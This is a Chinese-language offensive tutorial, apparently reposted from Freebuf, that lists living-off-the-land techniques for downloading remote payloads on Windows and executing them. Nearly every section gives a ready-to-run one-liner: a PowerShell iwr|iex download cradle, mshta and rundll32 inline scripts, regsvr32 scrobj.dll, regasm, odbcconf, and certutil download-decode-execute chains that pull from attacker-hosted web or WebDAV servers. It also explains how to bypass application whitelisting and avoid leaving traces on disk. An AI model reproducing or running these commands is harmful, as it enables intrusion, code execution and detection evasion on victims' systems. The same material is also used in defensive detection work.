# Windows下载远程Payload并执行代码的各种技巧

@转自Freebuf

首先，这些命令行工具需要满足以下条件：

1. 允许执行任意代码；

2. 支持从远程服务器下载Payload；

3. 支持代理；

4. 支持尽可能多的Microsoft标准（或使用广泛的）代码库；

5. 只会在内存中执行，而不会在磁盘中留下痕迹；

实际上，前人已经在这个领域做出了很多的努力。尤其是@subTee，他不仅设计出了应用程序白名单绕过技术，而且他还发明了使用Microsoft内置代码库来执行任意代码的方法。

需要注意的是，并非所有的命令行工具都满足上述所有的条件，尤其是上面的第五点，因为在绝大多数情况下，工具都会在目标系统的本地磁盘中下载Payload或其他恶意文件。

如果考虑到需要从远程服务器下载Payload文件的话，一般只有下面这三种可能的情况：

1. 命令本身可以接受一个HTTP URL作为其中一个参数；

2. 命令接受一个UNC路径（指向一台WebDAV服务器）；

3. 命令能够执行一个小型的内联脚本（脚本负责完成下载任务）；

根据Windows系统版本的不同（Win 7或Win 10），系统会将那些通过HTTP下载的对象存储在不同的IE本地缓存之中：

    C:\Users\<username>\AppData\Local\Microsoft\Windows\TemporaryInternet Files\
    C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>

而通过UNC路径（指向一台WebDAV服务器）访问的文件将会被存储在WebDAV客户端本地缓存之中：

    C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV

在使用UNC路径指向一台托管了Payload的WebDAV服务器时，请记住一点：只有当WebClient服务开启之后该功能才能正常工作。假设该服务没有开启，那么如果你想使用低权限用户角色来开启该服务的话，可以直接在命令行界面中使用命令`pushd \\webdavserver & popd`。

在下面给出的场景中，我们将会给大家介绍几种热门命令行工具的使用以及注意事项。

## PowerShell

毫无疑问，Powershell绝对是目前最著名的命令行工具了，但同时它也受监控最多的一个了。下面给出的是一种代理友好型命令：

    powershell -exec bypass -c"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

在这条命令中，负责执行网络调用的是powershell.exe，而且不会在本地磁盘中写入Payload。

当然了，你也可以对命令进行部分编码。除此之外，你还可以直接从一台WebDAV服务器来调用Payload：

    powershell -exec bypass -f \\webdavserver\folder\payload.ps1

在上面这条命令中，负责执行网络调用的是svchost.exe，而命令会将下载的Payload文件写入到WebDAV客户端本地缓存之中。

## Cmd

当你想使用cmd.exe运行一个批处理文件时，为什么情况会变得很复杂呢？尤其是当你的批处理文件不仅会执行一系列命令，而且还嵌入了任意类型文件的时候。命令如下：

    cmd.exe /k <\\webdavserver\folder\batchfile.txt

在上述命令中，负责执行网络调用的是svchost.exe，而命令会将下载的Payload文件写入到WebDAV客户端本地缓存之中。

## Cscript/Wscript

这两种命令行工具也是很常见的，我们可以使用一行命令来从一台远程服务器中下载Payload：

    cscript //E:jscript\\webdavserver\folder\payload.txt

在上述命令中，负责执行网络调用的是svchost.exe，而命令会将下载的Payload文件写入到WebDAV客户端本地缓存之中。

## Mshta

实际上，Mshta跟cscript/wscript是一类的，但是它还可以执行内联脚本，我们可以通过内联脚本来下载并执行Payload代码：

    mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))

在上述命令中，负责执行网络调用的是mshta.exe，而命令会将下载的Payload文件写入到IE本地缓存之中。

由于mshta还可以接受URL地址作为参数并执行HTA文件，因此我们还可以使用下面这种小技巧来执行命令：

    mshta http://webserver/payload.hta

其中，负责执行网络调用的是mshta.exe，而命令会将下载的Payload文件写入到IE本地缓存之中。

除此之外，下面的命令还可以隐藏mshta.exe所下载的内容：

    mshta \\webdavserver\folder\payload.hta

其中，负责执行网络调用的是svchost.exe，而命令会将下载的Payload文件写入到WebDAV客户端本地缓存之中。

## Rundll32

Rundll32也非常出名，它的使用方式非常多样化。首先，我们可以使用UNC路径来引用一个标准的DLL文件：

    rundll32 \\webdavserver\folder\payload.dll,entrypoint

在上述命令中，负责执行网络调用的是mshta.exe，而命令会将下载的Payload文件写入到IE本地缓存之中。

Rundll32还可以用来调用某些内联脚本：

    rundll32.exejavascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();

其中，负责执行网络调用的是rundll32.exe，而命令会将下载的Payload文件写入到IE本地缓存之中。

## Regasm/Regsvc

Regasm和Regsvc是@subTee发明的其中一种应用程序白名单绕过技术，你需要创建一个特殊的DLL（可使用.Net或C#编写）来获取相应接口，然后通过WebDAV来调用这个文件：

    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe/u \\webdavserver\folder\payload.dll

其中，负责执行网络调用的是svchost.exe，而命令会将下载的Payload文件写入到WebDAV客户端本地缓存之中。

## Regsvr32

这种技术也是@subTee发明的，它需要的脚本跟mshta所使用的有些许不同。首选方法如下：

    regsvr32 /u /n /s/i:http://webserver/payload.sct scrobj.dll

负责执行网络调用的是regsvr32.exe，而命令会将下载的Payload文件写入到IE本地缓存之中。

其次，我们还可以使用UNC/WebDAV：

    regsvr32 /u /n /s/i:\\webdavserver\folder\payload.sct scrobj.dll

其中，负责执行网络调用的是svchost.exe，而命令会将下载的Payload文件写入到WebDAV客户端本地缓存之中。

## Odbcconf

Odbcconf跟regsvr32有些类似，它同样是@subTee发明的。它能够执行包含特殊功能的DLL，需要注意的是，这种DLL文件不需要使用.dll后缀，而且可以通过UNC/WebDAV下载：

    odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}

其中，负责执行网络调用的是svchost.exe，而命令会将下载的Payload文件写入到WebDAV客户端本地缓存之中。
命令结合

实际上，我们可以根据自己的需要来同时运行多条命令。

比如说，整个Payload下载部分我们都可以通过certutil.exe来完成：

    certutil -urlcache -split -fhttp://webserver/payload payload

除此之外，我们还可以用certutil.exe配合InstallUtil.exe来执行特殊的DLL：

    certutil -urlcache -split -fhttp://webserver/payload.b64 payload.b64 & certutil -decode payload.b64payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil/logfile= /LogToConsole=false /u payload.dll

当然了，你也可以直接传递一个可执行文件：

    certutil -urlcache -split -fhttp://webserver/payload.b64 payload.b64 & certutil -decode payload.b64payload.exe & payload.exe

## Payload样本

你可以从atomic-red-team的GitHub代码库中获取可用的Payload样本：

GitHub地址：https://github.com/redcanaryco/atomic-red-team

除此之外，你也可以从GreatSCT项目的GitHub中获取自动生成的Payload:

GitHub地址：https://github.com/GreatSCT/GreatSCT